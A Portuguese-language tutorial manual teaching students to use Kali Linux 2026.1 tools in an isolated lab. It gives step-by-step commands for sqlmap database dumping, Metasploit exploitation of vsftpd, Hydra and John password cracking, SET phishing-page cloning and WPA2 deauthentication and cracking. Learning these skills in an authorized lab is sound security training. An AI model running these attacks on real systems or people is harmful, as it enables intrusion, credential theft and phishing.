

**Módulo 1: O Dojo Digital — Construindo Seu Laboratório Virtual**

Antes de aprendermos a arrombar fechaduras, precisamos construir uma casa de bonecas para treinar. Executar as ferramentas deste manual em redes alheias sem autorização expressa é crime. Como estudantes de ADS, a ética é o nosso compilador: sem ela, o código não roda.

### **1.1 A Arquitetura do Isolamento**

O Kali Linux é, por definição, uma maleta cheia de explosivos, serras elétricas e gazuas digitais. Você não abriria essa maleta na sala de estar da sua avó, certo? No mundo digital, a "sala da avó" é a sua rede Wi-Fi doméstica, onde seus pais acessam o banco e seu irmão joga online. Para proteger esses ativos, utilizamos a virtualização.

O conceito fundamental aqui é o "Sandbox" (Caixa de Areia). Vamos criar um universo paralelo dentro do seu computador, onde o Kali Linux será o predador e máquinas vulneráveis serão as presas.

#### **Requisitos de Hardware para 2026**

Para rodar o Kali 2026.1 com as novas ferramentas de automação e ambientes gráficos modernos (Gnome 49 ou KDE Plasma 6.5), seu hardware precisa de fôlego 2:

* **Processador:** Virtualização habilitada na BIOS (VT-x ou AMD-V).  
* **RAM:** Mínimo absoluto de 2GB para o Kali (modo texto), mas recomendamos fortemente 4GB a 8GB se você pretende usar ferramentas Java pesadas como o Burp Suite ou o Autopsy.3  
* **Armazenamento:** 20GB de espaço em disco é o piso. Logs de varreduras, capturas de pacotes (PCAP) e a criação de *wordlists* personalizadas consomem disco vorazmente. O ideal é reservar 50GB.

#### **Topologia de Rede Segura**

A configuração de rede das suas Máquinas Virtuais (VMs) é a barreira crítica de segurança. Vamos utilizar softwares como VirtualBox ou VMware Player.

| Modo de Rede | Comportamento | Nível de Segurança para Lab |
| :---- | :---- | :---- |
| **NAT** | A VM acessa a internet através do host, mas a internet não acessa a VM. As VMs não se veem facilmente. | Médio (Bom para atualizações, ruim para ataques entre VMs). |
| **Bridged (Ponte)** | A VM ganha um IP da sua rede real (ex: 192.168.1.x). Ela vira um dispositivo "real" na sua casa. | **Perigoso**. Expõe a máquina vulnerável à internet e permite que o Kali ataque sua TV Smart ou PC do pai por engano. |
| **Host-Only / Internal** | Cria uma rede fechada, visível apenas para o seu PC e as outras VMs. Sem acesso à internet externa (por padrão). | **Ideal**. Cria um "aquário" isolado onde o tubarão (Kali) e o peixe (Vítima) nadam juntos sem risco de vazamento. |

**Atenção Crítica:** Para este manual, configure seu adaptador de rede no modo **Host-Only** (ou Rede Interna). Se precisar atualizar o Kali, mude temporariamente para NAT, atualize e volte para Host-Only.4

### **1.2 Os Alvos: Metasploitable e DVWA**

Não adianta ter um canhão se não há alvo. Utilizaremos duas vítimas clássicas e pedagógicas:

1. **Metasploitable 2 (ou 3):** Uma máquina virtual Linux criada pela Rapid7 (mesma criadora do Metasploit). Ela é intencionalmente configurada com todos os erros possíveis: serviços desatualizados, senhas fracas, portas abertas desnecessárias. É o "saco de pancadas" perfeito para testes de infraestrutura.4  
2. **DVWA (Damn Vulnerable Web Application):** Uma aplicação web escrita em PHP/MySQL, cheia de falhas de código. É perfeita para estudantes de ADS porque mostra exatamente o que acontece quando você escreve código inseguro (SQL Injection, XSS, etc.). O DVWA permite ajustar o nível de segurança (Low, Medium, High, Impossible), servindo como um excelente professor de programação segura.5

## ---

**Módulo 2: O Novo Kali 2026.1 e a Revolução da Experiência do Usuário**

Antes de partirmos para o ataque, vamos entender o terreno. O lançamento do Kali Linux 2026.1 em janeiro trouxe mudanças significativas, não apenas "por baixo do capô", mas na forma como interagimos com o sistema.1

### **2.1 Interface e Usabilidade: Gnome 49 e KDE Plasma 6.5**

Para quem vem do Windows ou macOS, o Linux pode parecer árido. A OffSec investiu pesado na interface visual. O novo **Gnome 49** e o **KDE Plasma 6.5** trazem um polimento visual que torna o trabalho prolongado menos cansativo.

* **Wayland por Padrão:** O servidor gráfico X11, um dinossauro dos anos 80, está sendo aposentado. O Kali agora usa Wayland, o que melhora a segurança (isolamento entre janelas) e a performance gráfica, especialmente em VMs.2  
* **Acessibilidade:** Um recurso interessante de 2026 é o retorno da síntese de voz no instalador, permitindo que deficientes visuais instalem o sistema com autonomia.1

### **2.2 A Imagem "Kali Everything"**

Antigamente, você baixava o Kali e passava horas instalando ferramentas extras. A versão 2026.1 introduziu a imagem **Kali Everything**. É um download massivo que contém *todos* os pacotes disponíveis nos repositórios. Para um laboratório offline ou para situações onde você não terá internet, essa imagem é a "bala de prata" que garante que você nunca ficará na mão por falta de uma dependência.1

## ---

**Módulo 3: Reconhecimento e Coleta de Informações (Information Gathering)**

No ciclo de vida de um ataque cibernético (Cyber Kill Chain), o reconhecimento é a fase mais longa e crucial. Se você não sabe o que está atacando, você já perdeu.


**Módulo 4: A Revolução "Go" no Kali 2026.1 — Velocidade e Automação**

Uma das maiores inovações trazidas e consolidadas no Kali 2026.1 é a inclusão nativa das ferramentas desenvolvidas pela comunidade de *bug bounty*, principalmente as do **ProjectDiscovery**. Elas são escritas na linguagem Go (Golang), o que lhes confere uma velocidade de execução e paralelismo que ferramentas antigas em Python ou Perl não conseguem acompanhar.


### **4.3 Nuclei: O Sniper Baseado em Templates**

Função: O Nuclei é talvez a ferramenta mais importante da nova geração. Diferente de scanners tradicionais que tentam "adivinhar" vulnerabilidades, o Nuclei usa templates (modelos YAML) criados pela comunidade. Se uma nova vulnerabilidade crítica (Zero-Day) é descoberta hoje de manhã, à tarde a comunidade já criou um template para ela.  
Exemplo Prático:

Bash

nuclei \-u http://192.168.56.101 \-t cves/

Este comando verifica o alvo contra todos os templates de vulnerabilidades conhecidas (CVEs). A precisão é altíssima e os falsos positivos são raros, pois ele verifica condições específicas (ex: "se eu enviar X, o servidor tem que responder Y").

## ---

**Módulo 5: Análise de Vulnerabilidades Web — Caçando Bugs**

A web é o campo de batalha mais comum hoje. Aplicações web são complexas, mudam rápido e são frequentemente mal codificadas.

### **5.1 Nikto: O Inspetor de Código Velho**

#### **Origem Histórica**

Lançado em 27 de dezembro de 2001 por Chris Sullo, o Nikto é um veterano escrito em Perl.18 Seu nome vem da frase alienígena "Klaatu barada nikto" do filme *O Dia em que a Terra Parou*. Apesar da idade, ele continua relevante porque os erros de configuração de servidores web (arquivos padrão esquecidos, versões desatualizadas) continuam os mesmos há 20 anos.

#### **Função e Prática**

O Nikto não entende a lógica da sua aplicação (ele não sabe fazer login ou adicionar itens ao carrinho), mas ele escaneia o servidor web em busca de mais de 6700 arquivos e programas perigosos conhecidos.20  
Comando no Lab:

Bash

nikto \-h http://192.168.56.101/dvwa/

Analisando a Saída:  
O Nikto vai gritar na tela coisas como:

* \+ Server: Apache/2.2.8 (Ubuntu) \-\> Informação de versão (útil para buscar exploits).  
* \+ /dvwa/config/config.inc.php: PHP config file may contain database IDs and passwords. \-\> Alerta de arquivo sensível exposto.  
* \+ X-Frame-Options header is not present. \-\> Vulnerabilidade de Clickjacking.21

**Nota de Aula:** O Nikto é extremamente "barulhento". Em um cenário real, qualquer Firewall de Aplicação Web (WAF) ou IDS bloquearia o seu IP em segundos após o início do scan. Ele é uma ferramenta de "bater a porta", não de furtividade.22

### **5.2 Burp Suite: O Laboratório de Manipulação HTTP**

Se você quer trabalhar com segurança de aplicações web (AppSec), o Burp Suite é obrigatório. Não é opcional.

#### **Origem Histórica**

Desenvolvido por Dafydd Stuttard, fundador da PortSwigger e autor do livro seminal *The Web Application Hacker's Handbook*. Começou em 2003 como um conjunto de pequenas ferramentas que foram unificadas em uma suíte poderosa.23

#### **O Conceito de Proxy de Interceptação**

A web funciona com requisições (você pede) e respostas (o servidor entrega). O navegador esconde isso de você. O Burp Suite se coloca no meio desse caminho (Man-in-the-Middle).  
Imagine que você escreve uma carta de amor e entrega ao carteiro. O Burp é um carteiro malicioso que abre a carta na esquina, muda "Eu te amo" para "Eu quero terminar", fecha a carta e entrega. O destinatário recebe a mensagem alterada e acredita que é genuína.

#### **Prática: Interceptação e Modificação no DVWA**

1. **Setup:** Abra o Burp Suite Community no Kali. Vá na aba Proxy \-\> Intercept e garanta que Intercept is on. Clique em Open Browser (o Burp abrirá um navegador Chromium pré-configurado).25  
2. **Captura:** No navegador do Burp, acesse o DVWA e tente fazer login. A página vai "carregar infinitamente".  
3. **Análise:** Volte ao Burp. Você verá a requisição parada ali. Você pode ver o usuário e senha que digitou em texto claro.  
4. **Manipulação:** Você pode editar os dados ali mesmo e clicar em Forward para enviar ao servidor.  
5. **Repeater:** Clique com o botão direito na requisição e envie para o Repeater. Essa é a ferramenta mágica. No Repeater, você pode alterar a requisição e reenviar quantas vezes quiser, vendo a resposta em tempo real. É assim que testamos SQL Injection manualmente, tentando quebrar a lógica do banco de dados sem precisar preencher formulários no navegador repetidamente.26

## ---

**Módulo 6: Automação de Ataques Web — SQLMap**

Escrever injeções de SQL manualmente no Burp Suite é educativo, mas em um pentest real, precisamos de velocidade e extração de dados em massa.

### **6.1 SQLMap: A Broca de Banco de Dados**

#### **Origem Histórica**

O projeto SQLMap nasceu em 2006, criado por Bernardo Damele e Daniele Bellucci. Antes dele, a exploração de SQL Injection era uma arte manual e tediosa. O SQLMap automatizou a detecção de todos os tipos de injeção (Blind, Time-based, Error-based, UNION) e tornou a extração de bancos de dados inteiros uma tarefa trivial.27

#### **Prática: Extraindo a Base de Dados do DVWA**

No DVWA (ajustado para segurança "Low"), vá para a aba "SQL Injection". Digite um ID (ex: 1\) e clique em Submit. Copie a URL gerada (algo como ...id=1...) e pegue o cookie da sessão (PHPSESSID) usando o navegador (F12 \-\> Storage \-\> Cookies).

**Comando:**

Bash

sqlmap \-u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit" \--cookie="security=low; PHPSESSID=seu\_cookie\_aqui" \--dbs

**O que acontece:**

* \-u: Define a URL alvo.  
* \--cookie: Passa a autenticação (sem isso, o SQLMap bate na tela de login e falha).  
* \--dbs: Instrui a ferramenta a, se encontrar uma falha, listar os nomes dos bancos de dados disponíveis.29

Se o SQLMap confirmar a vulnerabilidade, ele listará os bancos (ex: dvwa, information\_schema). Você pode então aprofundar:

Bash

sqlmap \-u "..." \--cookie="..." \-D dvwa \--tables

Isso listará as tabelas do banco dvwa (ex: users). E finalmente:

Bash

sqlmap \-u "..." \--cookie="..." \-D dvwa \-T users \--dump

Isso extrairá ("dump") todo o conteúdo da tabela users, revelando nomes e hashes de senhas. É o pesadelo de qualquer administrador de banco de dados.31

## ---

**Módulo 7: O Framework de Exploração — Metasploit**

Descobrir a falha é uma coisa; explorá-la para ganhar controle do sistema é outra. É aqui que entra o peso pesado.

### **7.1 Metasploit Framework: O Arsenal Universal**

#### **Origem Histórica: O Jogo Mudou em 2003**

Antes de 2003, se você queria usar um exploit, tinha que baixar códigos obscuros em C de sites duvidosos, compilá-los e rezar para que não quebrassem seu sistema. H.D. Moore mudou isso ao lançar o Metasploit (então em Perl, depois reescrito em Ruby). Ele criou uma plataforma padronizada onde exploits podiam ser escritos, testados e executados de forma confiável. Em 2009, o projeto foi adquirido pela Rapid7, profissionalizando ainda mais a ferramenta.32

#### **Anatomia de um Ataque**

Para usar o Metasploit, você precisa entender seus componentes 32:

1. **Exploit:** O código que tira proveito da vulnerabilidade (o "míssil").  
2. **Payload:** O código que roda no alvo *após* a invasão bem-sucedida (a "ogiva"). Pode ser um simples shell de comando ou o poderoso **Meterpreter**.  
3. **Auxiliary:** Scanners e ferramentas que não garantem acesso, mas ajudam no processo (como o scanner de versão de FTP).  
4. **Encoder:** Tenta ofuscar o payload para passar por antivírus (hoje em dia, menos eficaz contra EDRs modernos).

#### **Prática: Hackeando o VSFTPD 2.3.4**

A Metasploitable roda uma versão do servidor FTP (vsftpd 2.3.4) que contém um *backdoor* colocado maliciosamente por hackers no código-fonte original em 2011.Vamos explorá-lo.

1. Inicie o console: msfconsole.  
2. **Busca:** search vsftpd. O Metasploit listará os módulos disponíveis.  
3. **Seleção:** use exploit/unix/ftp/vsftpd\_234\_backdoor.  
4. Configuração: Digite show options para ver o que precisa ser configurado. Geralmente, precisamos definir o alvo:  
   set RHOSTS 192.168.56.101 (IP da vítima).  
5. **Ataque:** Digite exploit.

Se funcionar, o prompt mudará. Você não verá mais msf6 \>, mas sim um shell de comando. Digite whoami. Se a resposta for root, parabéns: você comprometeu totalmente o servidor. Você agora tem controle total sobre a máquina vítima.34

## ---

**Módulo 8: Ataques de Senha — Quando a Falha é Humana**

Muitas vezes, o software é seguro, mas o usuário escolheu a senha "123456".

### **8.1 Hydra: A Força Bruta Online**

#### **Origem Histórica**

O **THC-Hydra** foi criado pelo grupo *The Hacker's Choice* (THC), liderado por *van Hauser*, no final dos anos 90.Ele foi revolucionário por paralelizar tentativas de login, suportando dezenas de protocolos diferentes.35

#### **Prática: Arrombando o SSH**

Vamos supor que o Nmap mostrou a porta 22 (SSH) aberta na Metasploitable. Não temos um exploit, então vamos tentar adivinhar a senha. Precisamos de uma **Wordlist** (lista de palavras). O Kali traz a lendária rockyou.txt (uma lista real vazada de um site chamado RockYou em 2009, contendo milhões de senhas reais).37

Bash

hydra \-l msfadmin \-P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101

* \-l: Define o login (usuário). Se não soubéssemos, usaríamos \-L com uma lista de usuários.  
* \-P: Define a lista de senhas.  
* ssh://: O protocolo alvo.

O Hydra testará milhares de senhas por minuto. Quando encontrar, ele exibirá em verde: login: msfadmin password: msfadmin.

### **8.2 John the Ripper: O Quebrador Offline**

#### **Origem Histórica**

Lançado em 1996, o "John" é uma lenda. Seu nome brinca com "Jack the Ripper" (Jack, o Estripador), sugerindo que ele estripa hashes de senhas. Ele trabalha offline: você rouba o arquivo de senhas criptografadas (hashes) e tenta quebrá-las no seu computador, sem fazer barulho na rede.38

#### **Prática**

Se conseguirmos acesso à máquina vítima e baixarmos o arquivo /etc/shadow (onde o Linux guarda os hashes), podemos usar o John:

Bash

john \--wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Ele aplicará algoritmos de hash em cada palavra da lista e comparará com o hash roubado. Se bater, a senha é revelada.

## ---

**Módulo 9: Engenharia Social — Hackeando Pessoas**

A ferramenta mais perigosa do Kali não ataca máquinas, ataca a mente humana.

### **9.1 Social-Engineer Toolkit (SET)**

#### **Origem Histórica**

Criado por Dave Kennedy (ReL1K), fundador da TrustedSec, o SET automatizou o processo de criar páginas falsas e ataques de phishing, que antes eram feitos manualmente. Ele ganhou fama ao ser apresentado na DEFCON e integrar a cultura de pentest focado no humano.39

#### **Prática: Clonagem de Site (Credential Harvester)**

**Aviso:** Use apenas em laboratório ou com autorização explícita.

1. Inicie: sudo setoolkit.  
2. Navegue pelos menus:  
   *   
     1. Social-Engineering Attacks  
   *   
     2. Website Attack Vectors  
   *   
     3. Credential Harvester Attack Method  
   *   
     2. Site Cloner  
3. O SET perguntará o IP para receber os dados (o seu Kali) e a URL para clonar (ex: página de login do Facebook ou portal da universidade).  
4. O SET clona o HTML exato da página e sobe um servidor web no seu Kali.  
5. Se você enviar o link (seu IP) para a vítima e ela digitar a senha na página falsa, o SET captura os dados e os exibe no seu terminal em texto claro, redirecionando a vítima para o site real em seguida para não levantar suspeitas.41

## ---

**Módulo 10: Ataques Wireless (Wi-Fi) — O Ar é Livre**

Invadir redes Wi-Fi exige hardware específico e compreensão do protocolo 802.11.

### **10.1 Aircrack-ng: A Suíte Padrão**

#### **Origem Histórica**

O Aircrack original foi criado por Christophe Devine. Em 2006, Thomas d'Otreppe criou um *fork* chamado Aircrack-ng (Next Generation), que se tornou o padrão da indústria.43

#### **Conceito: Modo Monitor**

Para hackear Wi-Fi, sua placa de rede precisa suportar **Modo Monitor**. Placas normais ignoram tráfego que não é endereçado a elas. No modo monitor, a placa "ouve" tudo que passa pelo ar, essencial para capturar handshakes.44

#### **Prática: Quebrando WPA2**

1. **Monitorar:** sudo airmon-ng start wlan0. Isso cria uma interface virtual (ex: wlan0mon).  
2. **Escanear:** sudo airodump-ng wlan0mon. Isso lista as redes ao redor.  
3. **Focar:** sudo airodump-ng \-c \[canal\] \--bssid \-w captura wlan0mon. Focamos em um alvo e gravamos os pacotes.  
4. Desautenticar (O Ataque): Para capturar a senha, precisamos que alguém se conecte. Usamos o aireplay-ng para enviar pacotes de "Desautenticação", derrubando um usuário legítimo.  
   sudo aireplay-ng \--deauth 10 \-a \-c \[MAC Cliente\] wlan0mon.  
5. **Captura:** Quando o usuário reconecta automaticamente, seu computador envia o "4-way Handshake" (aperto de mão criptografado). O airodump-ng captura isso.  
6. Quebrar: Com o handshake capturado, usamos força bruta offline:  
   aircrack-ng \-w wordlist.txt captura-01.cap. Se a senha estiver na lista, o Aircrack a revelará.45

## ---

**Módulo 11: Análise Forense Digital — Autopsy**

Após o ataque (ou para investigar um), precisamos analisar os rastros.

### **11.1 Autopsy: O Legista Digital**

#### **Origem Histórica**

Criado por Brian Carrier, o Autopsy é a interface gráfica para o *The Sleuth Kit* (TSK). Ele evoluiu de uma ferramenta simples para uma plataforma forense completa baseada em Java, usada por forças da lei para analisar discos rígidos em casos criminais.47

#### **Prática: Analisando uma Imagem de Disco**

1. Inicie o Autopsy (pode demorar para carregar, é pesado).  
2. **New Case:** Crie um caso novo.  
3. **Add Data Source:** Selecione "Disk Image" e aponte para um arquivo .dd ou .E01 (imagens forenses de discos).  
4. **Ingest Modules:** O Autopsy perguntará quais módulos rodar. Módulos como "Recent Activity" recuperam histórico web; "Deleted Files" tentam recuperar arquivos apagados.  
5. **Análise:** Após o processamento, você pode navegar pela árvore de arquivos, ver imagens deletadas, ler e-mails e buscar por palavras-chave (ex: "droga", "dinheiro", "senha") em todo o conteúdo do disco.48

## ---

**Módulo 12: Análise de Tráfego — Wireshark**

Por fim, a ferramenta que vê a verdade nua e crua na rede.

### **12.1 Wireshark: O Raio-X**

#### **Origem Histórica**

Iniciado em 1998 por Gerald Combs como **Ethereal**, mudou de nome para Wireshark em 2006 devido a questões de marca registrada. É o padrão mundial para análise de pacotes.49

#### **Prática: Sniffing**

1. Abra o Wireshark e selecione a interface de rede.  
2. Inicie a captura (ícone de barbatana de tubarão).  
3. Gere tráfego (acesse um site HTTP não seguro na VM vítima).  
4. Pare a captura.  
5. Use o filtro http.  
6. Clique com o botão direito em um pacote e escolha "Follow TCP Stream". O Wireshark reconstrói a sessão inteira, mostrando o HTML da página, imagens e, se o site não usar HTTPS, senhas em texto claro. É a prova definitiva da importância da criptografia.49

## ---

**Conclusão: O Poder na Ponta dos Dedos**

Chegamos ao fim deste manual. O Kali Linux 2026.1 é uma obra de arte da engenharia de software, combinando décadas de história hacker com a modernidade da automação em Go.

Como acadêmico de ADS, lembre-se: saber usar essas ferramentas não faz de você um hacker; entender **como** elas funcionam faz de você um engenheiro. O Nmap ensina redes. O Burp ensina protocolo HTTP. O SQLMap ensina bancos de dados. O Metasploit ensina sistemas operacionais.

Use este conhecimento para construir sistemas mais seguros. A linha entre um profissional de segurança e um criminoso é tênue e definida por uma única palavra: **Autorização**. Nunca ultrapasse essa linha.

Bem-vindo ao mundo da Segurança Ofensiva.

### ---

**Tabela Resumo das Ferramentas Principais do Kali 2026.1**

| Categoria | Ferramenta | Função (Analogia) | Tecnologia/Linguagem | Origem Histórica |
| :---- | :---- | :---- | :---- | :---- |
| **Reconhecimento** | **Nmap** | Cartógrafo (Mapeia a rede) | C/C++ | Fyodor (1997) |
|  | **Maltego** | Detetive (Conecta relacionamentos) | Java | Paterva (2008) |
|  | **Dnsx** (Novo) | Resolvador Turbo (DNS em massa) | Go | ProjectDiscovery |
| **Vuln Analysis** | **Nikto** | Inspetor Predial (Acha falhas óbvias) | Perl | Chris Sullo (2001) |
|  | **Nuclei** (Novo) | Sniper (Templates de falhas) | Go | ProjectDiscovery |
| **Web Hacking** | **Burp Suite** | Carteiro Curioso (Intercepta dados) | Java | PortSwigger (2003) |
|  | **SQLMap** | Broca de Banco de Dados | Python | Damele/Bellucci (2006) |
| **Exploração** | **Metasploit** | Canhão Laser (Framework de ataque) | Ruby | HD Moore (2003) |
| **Senhas** | **Hydra** | Chaveiro Rápido (Força bruta online) | C | THC / van Hauser |
|  | **John the Ripper** | Decifrador (Quebra senhas offline) | C | Solar Designer (1996) |
| **Eng. Social** | **SET** | Ilusionista (Clona sites/Phishing) | Python | Dave Kennedy (2010) |
| **Wireless** | **Aircrack-ng** | Escuta de Rádio (Quebra Wi-Fi) | C | T. d'Otreppe (2006) |
| **Forense** | **Autopsy** | Médico Legista (Analisa discos) | Java/C++ | Brian Carrier (2001) |
| **Sniffing** | **Wireshark** | Raio-X (Vê pacotes na rede) | C/C++ | Gerald Combs (1998) |

#### **Referências citadas**

1. Kali Linux 2026.1 Released with New Tools and Kali Everything Image \- GBHackers, acessado em janeiro 10, 2026, [https://gbhackers.com/kali-linux-2026-1/](https://gbhackers.com/kali-linux-2026-1/)  
2. Kali Linux 2025.4 Release (Desktop Environments, Wayland & Halloween Mode), acessado em janeiro 10, 2026, [https://www.kali.org/blog/kali-linux-2025-4-release/](https://www.kali.org/blog/kali-linux-2025-4-release/)  
3. Kali Linux Tutorial 2026 (Beginners Easy Step-by-Step Guide) \- StationX, acessado em janeiro 10, 2026, [https://www.stationx.net/kali-linux-tutorial/](https://www.stationx.net/kali-linux-tutorial/)  
4. Kali Linux for Beginners in 2026: Setup, Safety, and Your First Tools, acessado em janeiro 10, 2026, [https://www.nucamp.co/blog/kali-linux-for-beginners-in-2026-setup-safety-and-your-first-tools](https://www.nucamp.co/blog/kali-linux-for-beginners-in-2026-setup-safety-and-your-first-tools)  
5. The Best DVWA (Damn Vulnerable Web Application) 2026 Guide \- StationX, acessado em janeiro 10, 2026, [https://www.stationx.net/dvwa-damn-vulnerable-web-application/](https://www.stationx.net/dvwa-damn-vulnerable-web-application/)  
6. The History and Future of Nmap | Nmap Network Scanning, acessado em janeiro 10, 2026, [https://nmap.org/book/history-future.html](https://nmap.org/book/history-future.html)  
7. The Evolution of Network Scanning: 25 Years of Nmap \- runZero, acessado em janeiro 10, 2026, [https://www.runzero.com/resources/nmap-interview-25/](https://www.runzero.com/resources/nmap-interview-25/)  
8. How to Use Nmap: Commands and Tutorial Guide \- Varonis, acessado em janeiro 10, 2026, [https://www.varonis.com/blog/nmap-commands](https://www.varonis.com/blog/nmap-commands)  
9. Nmap Cheat Sheet and Pro Tips \- HackerTarget.com, acessado em janeiro 10, 2026, [https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)  
10. Examples | Nmap Network Scanning, acessado em janeiro 10, 2026, [https://nmap.org/book/man-examples.html](https://nmap.org/book/man-examples.html)  
11. MALTEGO: Unraveling the Power of Open-Source Intelligence(OSINT), acessado em janeiro 10, 2026, [https://osintteam.blog/maltego-unraveling-the-power-of-open-source-intelligence-5e8000a2f996](https://osintteam.blog/maltego-unraveling-the-power-of-open-source-intelligence-5e8000a2f996)  
12. Release Notes for Maltego Graph (Desktop), acessado em janeiro 10, 2026, [https://docs.maltego.com/en/support/solutions/articles/15000053036-release-notes-for-maltego-graph-desktop-](https://docs.maltego.com/en/support/solutions/articles/15000053036-release-notes-for-maltego-graph-desktop-)  
13. Release Notes for Maltego Monitor, acessado em janeiro 10, 2026, [https://docs.maltego.com/en/support/solutions/articles/15000058936-release-notes-for-maltego-monitor](https://docs.maltego.com/en/support/solutions/articles/15000058936-release-notes-for-maltego-monitor)  
14. projectdiscovery/dnsx: dnsx is a fast and multi-purpose DNS toolkit allow to run multiple DNS queries of your choice with a list of user-supplied resolvers. \- GitHub, acessado em janeiro 10, 2026, [https://github.com/projectdiscovery/dnsx](https://github.com/projectdiscovery/dnsx)  
15. dnsx | Kali Linux Tools, acessado em janeiro 10, 2026, [https://www.kali.org/tools/dnsx/](https://www.kali.org/tools/dnsx/)  
16. naabu | Kali Linux Tools, acessado em janeiro 10, 2026, [https://www.kali.org/tools/naabu/](https://www.kali.org/tools/naabu/)  
17. nuclei | Kali Linux Tools, acessado em janeiro 10, 2026, [https://www.kali.org/tools/nuclei/](https://www.kali.org/tools/nuclei/)  
18. Nikto (vulnerability scanner) \- Wikipedia, acessado em janeiro 10, 2026, [https://en.wikipedia.org/wiki/Nikto\_(vulnerability\_scanner)](https://en.wikipedia.org/wiki/Nikto_\(vulnerability_scanner\))  
19. NIKTO THE SCANNING TOOL. This article mainly focuses on the… | by Vinayak Kelagar | Medium, acessado em janeiro 10, 2026, [https://medium.com/@vinayakkelagar7/abstract-7c1058f81b82?responsesOpen=true\&sortBy=REVERSE\_CHRON](https://medium.com/@vinayakkelagar7/abstract-7c1058f81b82?responsesOpen=true&sortBy=REVERSE_CHRON)  
20. Web Server Scanning With Nikto | Tutorials \- Armur AI, acessado em janeiro 10, 2026, [https://armur.ai/tutorials/nikto/nikto/what\_is\_nikto/](https://armur.ai/tutorials/nikto/nikto/what_is_nikto/)  
21. Interpret Nikto Scan Results for Web Server Vulnerabilities | LabEx, acessado em janeiro 10, 2026, [https://labex.io/tutorials/kali-interpret-standard-nikto-scan-results-594528](https://labex.io/tutorials/kali-interpret-standard-nikto-scan-results-594528)  
22. Nikto Cheat Sheet \- Commands & Examples \- HighOn.Coffee, acessado em janeiro 10, 2026, [https://highon.coffee/blog/nikto-cheat-sheet/](https://highon.coffee/blog/nikto-cheat-sheet/)  
23. Burp Suite \- Wikipedia, acessado em janeiro 10, 2026, [https://en.wikipedia.org/wiki/Burp\_Suite](https://en.wikipedia.org/wiki/Burp_Suite)  
24. Burp through the ages | Blog \- PortSwigger, acessado em janeiro 10, 2026, [https://portswigger.net/blog/burp-through-the-ages](https://portswigger.net/blog/burp-through-the-ages)  
25. Intercepting HTTP traffic with Burp Proxy \- PortSwigger, acessado em janeiro 10, 2026, [https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic)  
26. Burp Suite Tutorial: Intercepting, Modifying & Scanning HTTP Traffic \- Pynt, acessado em janeiro 10, 2026, [https://www.pynt.io/learning-hub/burp-suite-guides/burp-suite-tutorial-intercepting-modifying-scanning-http-traffic](https://www.pynt.io/learning-hub/burp-suite-guides/burp-suite-tutorial-intercepting-modifying-scanning-http-traffic)  
27. History · sqlmapproject/sqlmap Wiki \- GitHub, acessado em janeiro 10, 2026, [https://github.com/sqlmapproject/sqlmap/wiki/History](https://github.com/sqlmapproject/sqlmap/wiki/History)  
28. sqlmap \- Wikipedia, acessado em janeiro 10, 2026, [https://en.wikipedia.org/wiki/Sqlmap](https://en.wikipedia.org/wiki/Sqlmap)  
29. Using SQLmap to Dig for Sensitive Data in SQL Databases \- LevelBlue, acessado em janeiro 10, 2026, [https://levelblue.com/blogs/spiderlabs-blog/using-sqlmap-to-dig-for-sensitive-data-in-sql-databases](https://levelblue.com/blogs/spiderlabs-blog/using-sqlmap-to-dig-for-sensitive-data-in-sql-databases)  
30. SQLMap Guide: Exploit & Defend Against SQL Injection \- Network Intelligence, acessado em janeiro 10, 2026, [https://www.networkintelligence.ai/blogs/from-sql-injection-to-0wnage-using-sqlmap/](https://www.networkintelligence.ai/blogs/from-sql-injection-to-0wnage-using-sqlmap/)  
31. Practical Identification of SQL Injection Vulnerabilities \- CISA, acessado em janeiro 10, 2026, [https://www.cisa.gov/sites/default/files/publications/Practical-SQLi-Identification.pdf](https://www.cisa.gov/sites/default/files/publications/Practical-SQLi-Identification.pdf)  
32. What is Metasploit? \- UpGuard, acessado em janeiro 10, 2026, [https://www.upguard.com/blog/metasploit](https://www.upguard.com/blog/metasploit)  
33. Metasploit \- Wikipedia, acessado em janeiro 10, 2026, [https://en.wikipedia.org/wiki/Metasploit](https://en.wikipedia.org/wiki/Metasploit)  
34. Metasploit Tutorial 2026: The Complete Beginners Guide \- StationX, acessado em janeiro 10, 2026, [https://www.stationx.net/metasploit-tutorial/](https://www.stationx.net/metasploit-tutorial/)  
35. Malaysia » Van Hauser (Founder, THC.org and Security Consultant at n.runs GmbH), acessado em janeiro 10, 2026, [https://conference.hitb.org/hitbsecconf2006kl/index.html%3Fpage\_id=67.html](https://conference.hitb.org/hitbsecconf2006kl/index.html%3Fpage_id=67.html)  
36. hydra | Kali Linux Tools, acessado em janeiro 10, 2026, [https://www.kali.org/tools/hydra/](https://www.kali.org/tools/hydra/)  
37. Brute Force Attack: How Hydra cracks passwords? \- DataScientest, acessado em janeiro 10, 2026, [https://datascientest.com/en/everything-about-brute-force-attack](https://datascientest.com/en/everything-about-brute-force-attack)  
38. John the Ripper \- Wikipedia, acessado em janeiro 10, 2026, [https://en.wikipedia.org/wiki/John\_the\_Ripper](https://en.wikipedia.org/wiki/John_the_Ripper)  
39. The Social Engineering Toolkit's evolution, goals \- CSO Online, acessado em janeiro 10, 2026, [https://www.csoonline.com/article/535694/social-engineering-the-social-engineering-toolkit-s-evolution-goals.html](https://www.csoonline.com/article/535694/social-engineering-the-social-engineering-toolkit-s-evolution-goals.html)  
40. The Social Engineering Toolkit (SET) \- TrustedSec, acessado em janeiro 10, 2026, [https://trustedsec.com/resources/tools/the-social-engineer-toolkit-set](https://trustedsec.com/resources/tools/the-social-engineer-toolkit-set)  
41. Demo Social Engineering using SET \- KodeKloud Notes, acessado em janeiro 10, 2026, [https://notes.kodekloud.com/docs/CompTIA-Security-Certification/Security-Operations/Demo-Social-Engineering-using-SET](https://notes.kodekloud.com/docs/CompTIA-Security-Certification/Security-Operations/Demo-Social-Engineering-using-SET)  
42. How to Use theHarvester Tool \- Credential Harvesting Using Site Cloning \- YouTube, acessado em janeiro 10, 2026, [https://www.youtube.com/watch?v=-q1-2NLgbiE](https://www.youtube.com/watch?v=-q1-2NLgbiE)  
43. Aircrack-ng \- Wikipedia, acessado em janeiro 10, 2026, [https://en.wikipedia.org/wiki/Aircrack-ng](https://en.wikipedia.org/wiki/Aircrack-ng)  
